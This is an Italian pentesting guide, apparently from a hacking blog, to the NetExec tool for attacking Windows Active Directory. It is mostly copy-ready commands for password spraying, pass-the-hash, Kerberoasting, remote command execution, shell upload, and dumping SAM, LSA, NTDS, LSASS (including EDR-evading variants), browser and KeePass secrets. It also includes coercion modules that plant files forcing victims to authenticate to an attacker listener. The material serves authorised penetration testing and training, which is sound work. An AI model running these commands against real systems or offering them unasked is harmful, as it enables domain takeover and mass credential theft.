---
title: 'NetExec (NXC): Guida Completa al Successore di CrackMapExec'
slug: netexec
description: 'Guida operativa completa a NetExec (nxc): SMB, LDAP, WinRM, RDP, moduli avanzati, credential dumping, vulnerability scan e lateral movement in Active Directory'
image: /Gemini_Generated_Image_jxrwbzjxrwbzjxrw.webp
draft: false
date: 2026-01-24T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - netexec
  - nxc
featured: false
---

# NetExec (NXC): Pentest e Payload per Active Directory, SMB e LDAP

NetExec (nxc) è il successore diretto di CrackMapExec — nato nel 2023 dopo l'abbandono del progetto originale. Stessa filosofia, codebase migliorata, moduli estesi, manutenzione attiva. Se usi ancora `crackmapexec` stai usando uno strumento fermo al 2021.

Per il confronto con il vecchio CME: [CrackMapExec su HackIta](https://hackita.it/articoli/crackmapexec)

***

## Installazione

```bash
python3 -m pip install pipx
pipx ensurepath
pipx install netexec
```

Verifica installazione e lista moduli disponibili:

```bash
nxc --help
nxc smb -L    # lista tutti i moduli SMB
nxc ldap -L   # lista tutti i moduli LDAP
```

***

## Sintassi base

```bash
nxc <protocollo> <target> -u <utente> -p <password> [-M modulo] [-o opzione=valore]
```

Protocolli supportati: `smb`, `ldap`, `winrm`, `rdp`, `mssql`, `ssh`, `ftp`, `vnc`, `wmi`, `nfs`

Target flessibili — IP singolo, range, CIDR, file o combinazione:

```bash
nxc smb 10.10.10.10
nxc smb 10.10.10.0/24
nxc smb 10.10.10.10-22
nxc smb targets.txt
nxc smb DC.hackita.local 10.10.10.0/24 targets.txt
```

NXC parallelizza automaticamente le connessioni quando i target sono molti.

***

## Fase 0 — Ricognizione senza credenziali

Il primo passo in qualsiasi assessment interno è mappare la superficie. SMB è esposto di default su tutti i Windows — basta un comando per ottenere OS, dominio e versione del protocollo.

### Scan subnet SMB

```bash
nxc smb 10.10.10.0/24
```

Output: nome macchina, OS, dominio, SMB signing (se `True` il relay è bloccato), versione SMB. Serve per capire se sei in un dominio, individuare host legacy e valutare la possibilità di [NTLM relay](https://hackita.it/articoli/responder/).

### Null session e accesso anonimo

Alcune configurazioni legacy permettono autenticazione senza credenziali — SMB null session, FTP anonimo. Se funziona, ottieni enumerazione gratis.

```bash
nxc smb 10.10.10.10 --null-session
nxc smb 10.10.10.10 -u '' -p ''
nxc smb 10.10.10.10 -u 'guest' -p ''
nxc ftp 10.10.10.0/24 -u 'anonymous' -p '' --ls    # lista file FTP anonimi
```

### Enumerazione utenti senza credenziali

`--rid-brute` cicla i SID locali e di dominio chiedendo al DC di risolverli — tecnica classica per costruire una lista utenti prima dello spraying.

```bash
nxc smb 10.10.10.10 -u '' -p '' --users       # lista utenti via null session
nxc smb 10.10.10.10 -u '' -p '' --rid-brute   # enumera SID per ricavare nomi account
```

***

## Fase 1 — Autenticazione

Output chiave:

* `[+]` → credenziale valida
* `(Pwn3d!)` → admin locale — pivot possibile, puoi dumpare credenziali

### Password

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@'
nxc smb 10.10.10.0/24 -u hackita -p 'Hackita1@'    # verifica su tutta la subnet
```

### Pass-the-Hash (PTH)

PTH usa l'hash NTLM direttamente senza conoscere la password in chiaro — standard dopo un dump SAM o NTDS. L'hash vuoto `aad3b435b51404eeaad3b435b51404ee` è la parte LM (sempre uguale), l'hash dopo i `:` è quello NTLM. Per approfondire: [Pass-the-Hash su HackIta](https://hackita.it/articoli/pass-the-hash/).

```bash
nxc smb 10.10.10.10 -u hackita -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

### Kerberos (con TGT in ccache)

Se hai un TGT in cache (da certipy, rubeus, getTGT.py), puoi autenticarti senza password via Kerberos.

```bash
export KRB5CCNAME=/tmp/hackita.ccache
nxc smb 10.10.10.10 -u hackita --kerberos
```

### Autenticazione locale (no dominio)

`--local-auth` bypassa il DC e si autentica direttamente sulla macchina locale — utile per lateral movement con hash SAM.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --local-auth
```

### Certificato (PKINIT)

Dopo aver ottenuto un PFX via ADCS, puoi usarlo per autenticarti direttamente. Vedi [ESC1-ESC16 su HackIta](https://hackita.it/articoli/adcs-esc1-esc16/).

```bash
nxc ldap 10.10.10.10 -u hackita -p '' --certificate hackita.pfx
```

***

## Fase 2 — Password Spraying

Lo spraying testa una sola password su molti account — non triggera il lockout perché non supera la soglia per singolo account. **Leggi sempre la password policy prima di partire**.

### Controlla la policy prima di spraying

`--pass-pol` mostra soglia di lockout, durata, complessità e history — senza questa informazione rischi di bloccare account.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --pass-pol
```

### Un utente, molte password

```bash
nxc smb 10.10.10.0/24 -u administrator -p passwords.txt
```

### Molti utenti, una password (spray)

`--continue-on-success` non si ferma al primo match — utile per trovare più account con la stessa password.

```bash
nxc smb 10.10.10.0/24 -u users.txt -p 'Summer2024'
nxc smb 10.10.10.0/24 -u users.txt -p 'Hackita1@' --continue-on-success
```

### Coppie username:password (no bruteforce)

`--no-bruteforce` testa solo la coppia corrispondente riga per riga — perfetto per testare coppie user:pass trovate in un Excel o database.

```bash
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

***

## Fase 3 — Enumerazione SMB

[SMB](https://hackita.it/articoli/smb/) è il protocollo più ricco in un assessment AD — share, utenti, sessioni attive, policy.

### Share

`--shares` elenca tutte le share accessibili con i permessi dell'utente (READ/WRITE/NO ACCESS).

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --shares
```

### Spider completo di tutte le share

`spider_plus` esegue crawling ricorsivo di tutte le share accessibili e salva i risultati in JSON — molto più veloce di un listing manuale su decine di macchine. Con `DOWNLOAD_FLAG=TRUE` scarica tutti i file leggibili.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M spider_plus
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M spider_plus -o READ_ONLY=false
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M spider_plus -o DOWNLOAD_FLAG=TRUE EXCLUDE_FILTER=c$,ipc$,admin$
```

### File operations

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --share C$ --get-file Users\hackita\Documents\creds.txt creds.txt
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --share C$ --put-file shell.exe Temp\shell.exe
```

### Utenti, gruppi, sessioni

`--users` elenca tutti gli account del dominio con attributi base (SID, bad password count, ultimo login).
`--groups` elenca i gruppi AD con il numero di membri.
`--local-groups` elenca i gruppi locali della macchina — utile per trovare chi è admin locale.
`--loggedon-users` mostra chi è attualmente loggato tramite WMI — ottimo per sapere se ci sono admin interattivi.
`--sessions` mostra le sessioni SMB attive sul server.
`--computers` elenca tutti i computer del dominio con OS e versione.
`--rid-brute` cicla i RID per enumerare utenti e gruppi anche quando LDAP è bloccato.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --users
```

Output esempio:

```
SMB  10.10.10.10  445  DC01  [*] Enumerated 3 domain users
SMB  10.10.10.10  445  DC01  hackita.local\adminHackita      badpwdcount: 0  desc: Domain Administrator
SMB  10.10.10.10  445  DC01  hackita.local\editorHackita     badpwdcount: 0  desc: Blog Editor Account
SMB  10.10.10.10  445  DC01  hackita.local\developerHackita  badpwdcount: 2  desc: Dev - temp account
```

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --groups
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --local-groups
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --loggedon-users      # utenti loggati via WMI
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --smb-sessions         # sessioni SMB attive (richiede admin)
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --reg-sessions         # sessioni utente via Remote Registry
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --qwinsta              # sessioni RDP attive con IP sorgente e stato
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --tasklist             # processi in esecuzione via protocollo nativo
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --taskkill 1234        # killa processo per PID o nome
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --computers
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --rid-brute
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --interfaces           # interfacce di rete
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --disks                # dischi disponibili
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt             # genera lista host senza SMB signing → target per relay
```

Output esempio `--rid-brute`:

```
SMB  10.10.10.10  445  DC01  498: hackita.local\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB  10.10.10.10  445  DC01  500: hackita.local\adminHackita (SidTypeUser)
SMB  10.10.10.10  445  DC01  501: hackita.local\Guest (SidTypeUser)
SMB  10.10.10.10  445  DC01  502: hackita.local\krbtgt (SidTypeUser)
SMB  10.10.10.10  445  DC01  512: hackita.local\Domain Admins (SidTypeGroup)
SMB  10.10.10.10  445  DC01  1000: hackita.local\editorHackita (SidTypeUser)
SMB  10.10.10.10  445  DC01  1001: hackita.local\developerHackita (SidTypeUser)
```

***

## Fase 4 — Enumerazione LDAP

LDAP espone l'intera struttura del dominio — utenti, macchine, deleghe, policy — accessibile con qualsiasi account a basso privilegio. Per approfondire: [ldapsearch su HackIta](https://hackita.it/articoli/ldapsearch/).

### Base

`--admin-count` trova account con adminCount=1 — questi account sono stati admin in passato o lo sono ora, spesso con permessi elevati residui.
`--trusted-for-delegation` trova macchine e account con Unconstrained Delegation — chiunque si autentichi su di loro deposita il proprio TGT, permettendo impersonazione completa.
`--password-not-required` trova account con il flag PASSWD\_NOTREQD — possono avere password vuota.
`--find-delegation` enumera tutti i tipi di delega (unconstrained, constrained, resource-based).

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --users
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --active-users          # solo account abilitati (esclude disabilitati)
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --groups
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --computers
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --dc-list                # elenca tutti i Domain Controller del dominio
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --get-sid                # recupera il SID del dominio
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --admin-count
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --trusted-for-delegation
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --password-not-required
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --pso                    # Fine Grained Password Policy — alcune utenze hanno policy diversa da quella globale
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --find-delegation
```

### Query LDAP manuale

Per query personalizzate quando le opzioni standard non bastano.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --query "(name=administrator)" "msDS-AllowedToDelegateTo cn"
```

### AS-REP Roasting

`--asreproast` trova account senza pre-autenticazione Kerberos richiesta — il KDC risponde con un AS-REP crittografato con la password dell'utente, craccabile offline. `--no-preauth-targets` permette kerberoasting usando un account senza pre-auth come punto di partenza, senza credenziali valide. Per approfondire: [Kerberos su HackIta](https://hackita.it/articoli/kerberos/).

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --asreproast asrep.txt
nxc ldap 10.10.10.10 -u '' -p '' --asreproast asrep.txt    # senza credenziali se possibile
```

### Kerberoasting

`--kerberoasting` richiede TGS per tutti gli account con SPN — hash craccabile offline con hashcat `-m 13100`. Con `--kerberoast-account` puoi targetare account specifici invece di fare enumerate+roast di tutti.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --kerberoasting kerb.txt
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --kerberoast-account svc_mssql    # solo account specifico
```

### BloodHound collection senza SharpHound

Raccoglie tutti i dati necessari a BloodHound direttamente via LDAP/SMB — nessun eseguibile sul target. Per approfondire: [BloodHound su HackIta](https://hackita.it/articoli/bloodhound/).

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --bloodhound -ns 10.10.10.10 -c All
```

***

## Fase 5 — Moduli LDAP Avanzati

### ADCS — Certificate Authority

`adcs` enumera le Certificate Authority presenti nel dominio, i template disponibili e le configurazioni potenzialmente vulnerabili (ESC1-ESC8). Per approfondire: [ADCS ESC1-ESC16 su HackIta](https://hackita.it/articoli/adcs-esc1-esc16/).

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M adcs
```

### DACL — Lettura ACL

`daclread` legge i permessi sugli oggetti AD — GenericAll, WriteDACL, GenericWrite, WriteOwner sono i permessi sfruttabili per privilege escalation senza exploiting.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M daclread -o TARGET=victim PRINCIPAL=hackita RIGHTS='*'
```

### LAPS — Password amministratore locale

LAPS gestisce password univoche e rotanti per ogni macchina. Se l'account ha i permessi per leggerle (ms-Mcs-AdmPwd), ottieni admin locale su ogni target.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M laps
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M laps
```

### GMSA — Group Managed Service Accounts

Le GMSA hanno password rotanti gestite automaticamente dal DC. Se l'account ha `ReadGMSAPassword` nell'ACL, NXC dumpa l'hash NTLM — usabile direttamente per PTH.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --gmsa
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --gmsa-convert-id <id>
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --gmsa-decrypt-lsa <gmsa_account>
```

### Descrizioni utenti

`get-desc-users` legge il campo Description di ogni account AD — è sorprendentemente comune trovare password in chiaro o hint scritti dagli amministratori direttamente nella descrizione.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M get-desc-users
```

### Machine Account Quota

`maq` legge il valore ms-DS-MachineAccountQuota del dominio. Se MAQ > 0 (default 10), qualsiasi utente autenticato può aggiungere macchine al dominio — prerequisito per attacchi RBCD e shadow credentials.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M maq
```

### Account pre-Windows 2000

`pre2k` trova account creati con la spunta "pre-Windows 2000 compatible" — la loro password è tipicamente uguale al nome dell'account in lowercase. Ancora presenti in ambienti enterprise legacy.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M pre2k
```

### OS obsoleti

`obsolete` elenca macchine con OS fuori supporto (Windows XP, Server 2003, Server 2008) — target privilegiati per EternalBlue e vulnerabilità non patchate.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M obsolete
```

### DNS records

`get-network` legge i record DNS dal DC tramite LDAP — rivela host interni non visibili dalla semplice scansione di rete.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M get-network
```

### Trust tra domini

`enum_trusts` enumera tutti i trust configurati tra domini della forest — necessario per pianificare attacchi cross-domain.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M enum_trusts
```

### LDAP signing e channel binding

`ldap-checker` verifica se il DC richiede LDAP signing e channel binding — se disabilitati, è possibile relay LDAP.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M ldap-checker
```

***

## Fase 6 — Vulnerability Scan

### Scan in blocco

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M zerologon -M nopac -M printnightmare -M smbghost -M ms17-010
```

### ZeroLogon (CVE-2020-1472)

Permette di azzerare la password del computer account del DC senza credenziali — accesso immediato come DC. Altamente distruttivo, solo in lab o con autorizzazione esplicita.

```bash
nxc smb 10.10.10.10 -u '' -p '' -M zerologon
```

### noPAC (CVE-2021-42278/42287)

Un account standard può impersonare il DC creando un machine account con nome identico. Porta a DCSync completo da utente normale.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M nopac
```

### PrintNightmare

Verifica se il servizio Print Spooler è vulnerabile a esecuzione di codice arbitrario come SYSTEM.

```bash
nxc smb 10.10.10.10 -u '' -p '' -M printnightmare
```

### MS17-010 (EternalBlue)

```bash
nxc smb 10.10.10.10 -u '' -p '' -M ms17-010
```

### SMBGhost (CVE-2020-0796)

Buffer overflow nel driver SMBv3 — esecuzione codice kernel senza autenticazione su Windows 10/Server 2019 non patchati.

```bash
nxc smb 10.10.10.10 -u '' -p '' -M smbghost
```

### NTLM Reflection (CVE-2025-33073)

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M ntlm_reflection
```

### Coerce vulnerabilities

`coerce_plus` testa in un colpo tutti i vettori di coercion NTLM (PetitPotam via MS-EFSRPC, DFSCoerce, PrinterBug via MS-RPRN, MSEven, ShadowCoerce). Con `LISTENER` specificato, forza il target ad autenticarsi verso il listener — da combinare con [Responder](https://hackita.it/articoli/responder/) o ntlmrelayx.

```bash
nxc smb 10.10.10.10 -u '' -p '' -M coerce_plus
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M coerce_plus -o LISTENER=10.10.14.1
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M coerce_plus -o LISTENER=10.10.14.1 ALWAYS=true
```

### Timeroasting

Attacco che sfrutta il protocollo NTP — richiede il timestamp al DC usando il SID di un account macchina e ottiene un hash craccabile offline. Non richiede credenziali valide.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M timeroast
```

### WebDAV (WebClient service)

`webdav` verifica se il servizio WebClient è attivo — necessario per forzare autenticazione NTLM via HTTP invece di SMB, bypassando le protezioni SMB signing.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M webdav
```

### Print Spooler

Verifica se Print Spooler è attivo — prerequisito per PrinterBug (MS-RPRN) e parte di coerce\_plus.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M spooler
```

### ADCS CA via SMB

Enumera le Certificate Authority presenti nel dominio tramite SMB invece di LDAP.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M enum_ca
```

### Interfacce di rete aggiuntive

`ioxidresolver` enumera le interfacce di rete tramite DCOM/RPC — rivela subnet interne non visibili dalla rete corrente.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M ioxidresolver
```

***

## Fase 7 — Esecuzione Comandi

Non appena ottieni `(Pwn3d!)` puoi eseguire comandi remoti. NXC prova wmiexec di default ma supporta altri metodi — `smbexec` usa un servizio temporaneo, `atexec` usa Task Scheduler, `wmiexec` è il meno rumoroso. Per approfondire: [Impacket su HackIta](https://hackita.it/articoli/impacket/).

### CMD via SMB

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -x whoami
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -x whoami --exec-method smbexec
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -x whoami --exec-method wmiexec
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -x whoami --exec-method atexec
```

### PowerShell

`-X` esegue comandi PowerShell invece di cmd — necessario per cmdlet AD e operazioni più avanzate.

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -X "whoami /all"
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -X "Get-Process | Select-Object Name,Id"
```

### WinRM

WinRM usa la porta 5985 (HTTP) o 5986 (HTTPS) — richiede che l'utente sia nel gruppo Remote Management Users o sia admin locale.

```bash
nxc winrm 10.10.10.10 -u hackita -p 'Hackita1@' -x whoami
nxc winrm 10.10.10.10 -u hackita -p 'Hackita1@' -X "ipconfig /all"
```

### RDP (da v1.4.0)

```bash
nxc rdp 10.10.10.10 -u hackita -p 'Hackita1@' -x "whoami /all"
```

### Shadow RDP — hijack sessioni RDP esistenti

`shadowrdp` si aggancia a sessioni RDP attive di altri utenti come amministratore — senza interrompere la sessione corrente, invisibile all'utente.

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M shadowrdp
```

***

## Fase 8 — Credential Dumping

### SAM — hash utenti locali

`--sam` supporta due metodi: `regdump` (default, via registro) e `secdump` (via servizio). Contiene hash NTLM di tutti gli account locali.

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --sam
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --sam secdump    # metodo alternativo
```

### LSA secrets

`--lsa` supporta `regdump` e `secdump`. Contiene credenziali dei servizi configurati con account di dominio, hash della macchina ($MACHINE.ACC), chiavi Kerberos, credenziali cached.

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --lsa
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --lsa secdump
```

### NTDS — tutti gli hash del dominio

`--ntds` supporta due metodi: `drsuapi` (default — usa DCSync via RPC) e `vss` (Volume Shadow Copy — crea snapshot del disco). Per approfondire: [DCSync su HackIta](https://hackita.it/articoli/dcsync/).

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --ntds
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --ntds vss         # via Volume Shadow Copy
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --ntds --user hackita    # solo utente specifico
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --ntds --enabled         # solo account abilitati
```

### DPAPI — credenziali browser e vault

`--dpapi` decripta tutti i segreti DPAPI accessibili — password salvate in Chrome/Edge/Firefox, Windows Credential Manager, certificati utente. Con `cookies` dumpa anche i cookie del browser. Per approfondire: [DPAPI su HackIta](https://hackita.it/articoli/dpapi/).

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --dpapi
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --dpapi cookies    # include cookie browser
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --dpapi nosystem   # esclude DPAPI di SYSTEM
```

### SCCM — Microsoft Endpoint Configuration Manager

`sccm` dumpa le credenziali salvate in SCCM (System Center Configuration Manager) — spesso contiene account di servizio con privilegi elevati.

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --sccm
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --sccm wmi    # via WMI invece di disco
```

### LSASS dump — varianti stealth

`lsassy` è il metodo preferito — usa comsvcs.dll e MiniDumpWriteDump senza caricare eseguibili. Le alternative sotto usano tecniche diverse per bypassare EDR specifici.

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M lsassy       # preferito, più stealthy
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M nanodump      # bypass EDR/Defender, no accesso diretto a LSASS
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M handlekatz    # dump tramite handle duplicato
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M procdump      # usa Sysinternals procdump — rilevato facilmente
```

⚠️ I file dump vengono lasciati in `C:\Windows\Temp` — pulisci dopo l'uso.

### Mimikatz remoto

Esegue Mimikatz direttamente in remoto tramite SMB. Rumoroso — quasi tutti gli EDR lo rilevano. Per approfondire: [Mimikatz su HackIta](https://hackita.it/articoli/mimikatz/).

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M mimikatz
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'
```

### Token impersonation

`impersonate` elenca i token disponibili sulla macchina e permette di impersonare altri utenti senza le loro credenziali — tecnica di lateral movement senza password.

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M impersonate
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M impersonate -o Token=1 EXEC="whoami"
```

### GPP passwords (SYSVOL)

`gpp_password` cerca password in Group Policy Preferences — file XML in SYSVOL che gli amministratori usavano per deployare credenziali (vulnerabilità nota dal 2014, ancora presente in ambienti legacy).

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M gpp_password
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M gpp_autologin    # credenziali autologon in GPO
```

### MSOL — Azure AD Connect Sync

`msol` estrae la password dell'account MSOL (Microsoft Online Services) da Azure AD Connect — questo account ha privilegi DCSync di default sull'AD on-premise. Richiede admin locale sulla macchina con Azure AD Connect. Prima trova il server con `entra-id`:

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M entra-id    # trova il server Azure AD Connect
nxc smb <sync_server> -u administrator -p 'Hackita1@' -M msol  # dumpa la password MSOL
```

### Backup Operator → dump NTDS

Se l'account è nel gruppo Backup Operators, `backup_operator` sfrutta il privilegio SeBackupPrivilege per dumpare NTDS.dit senza essere Domain Admin.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M backup_operator
```

### Credenziali applicazioni

```bash
# Veeam Backup: estrae credenziali degli account di backup dal database Veeam (MSSQL locale)
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M veeam

# WinSCP: estrae sessioni salvate dal registro HKCU — include host, username e password cifrata
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M winscp

# PuTTY: estrae sessioni SSH salvate e chiavi private dal registro
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M putty

# MobaXterm: estrae sessioni e credenziali salvate da MobaXterm
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M mobaxterm

# mRemoteNG: estrae connessioni salvate da mRemoteNG (RDP, SSH, VNC manager)
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M mremoteng

# RDCMan: estrae credenziali da Remote Desktop Connection Manager
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M rdcman

# KeePass: trova database KeePass sul target
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M keepass_discover
# KeePass: inietta un trigger per estrarre le password quando l'utente apre il DB
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M keepass_trigger

# AWS: cerca credenziali AWS (~/.aws/credentials, variabili ambiente, file di config)
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M aws

# IIS: cerca credenziali nei file web.config e applicationHost.config
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M iis

# WiFi: legge le password delle reti WiFi salvate tramite netsh wlan
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M wifi

# PowerShell history: legge la history di PSReadLine
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M powershell_history

# Event log credentials: cerca credenziali in chiaro nei log degli eventi Windows
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M eventlog_creds

# Notepad++: legge il contenuto dei file non salvati aperti in Notepad++
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M notepad++
```

***

## Fase 9 — Coercion e NTLM Capture

Questi moduli piazzano file su share scrivibili che forzano il client Windows ad autenticarsi verso un server controllato dall'attaccante — catturando hash NTLMv2 non appena un utente naviga la cartella. Da combinare con [Responder](https://hackita.it/articoli/responder/).

```bash
# slinky: crea un file LNK (shortcut) che punta a un UNC path esterno
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M slinky -o SERVER=10.10.14.1

# scuffy: crea un file SCF (Shell Command File) — stessa logica del LNK ma più vecchio
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M scuffy -o SERVER=10.10.14.1

# drop-sc: crea un SearchConnector file che forza connessione SMB all'apertura
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M drop-sc -o SERVER=10.10.14.1

# drop-library-ms: sfrutta CVE-2025-24054 — file .library-ms che triggera autenticazione NTLM
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M drop-library-ms -o SERVER=10.10.14.1
```

***

## Fase 10 — AV/EDR Enumeration

Prima di eseguire moduli rumorosi come mimikatz o lsassy è fondamentale sapere cosa sta girando sul target — `enum_av` enumera prodotti AV/EDR tramite WMI e registro Windows.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M enum_av
```

***

## MSSQL

Per approfondire il servizio: [Porta 1433 MSSQL su HackIta](https://hackita.it/articoli/porta-1433-mssql/).

```bash
# Verifica autenticazione
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@'
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' --local-auth    # autenticazione locale SQL

# Elenca database disponibili
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' -q "SELECT name FROM master.dbo.sysdatabases"

# Privilege escalation — mssql_priv cerca misconfigurazioni (trustworthy database, impersonation)
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' -M mssql_priv
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' -M mssql_priv -o ACTION=privesc

# Abilita xp_cmdshell per eseguire comandi OS dal server SQL
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' -M enable_cmdshell -o ACTION=enable

# Esecuzione comando OS tramite xp_cmdshell
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' -x whoami

# Coercion via MSSQL — forza autenticazione NTLM del servizio SQL verso il listener
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' -M mssql_coerce -o LISTENER=10.10.14.1
```

***

## Output e Database

NXC salva automaticamente tutti i risultati (credenziali, host, sessioni) in un database SQLite locale consultabile con `nxcdb`.

```bash
nxc smb 10.10.10.0/24 -u hackita -p 'Hackita1@' --output output.csv
nxcdb    # console interattiva per interrogare il database
```

***

## Checklist Operativa

```
[ ] Scan subnet — identificare host e dominio
[ ] Null session — testare senza credenziali
[ ] Ottenuta prima credenziale → password policy prima di spraying
[ ] Password spray — --continue-on-success
[ ] Enumera share — --shares + spider_plus
[ ] Enumera utenti/gruppi via LDAP + --admin-count
[ ] Descrizioni utenti — -M get-desc-users
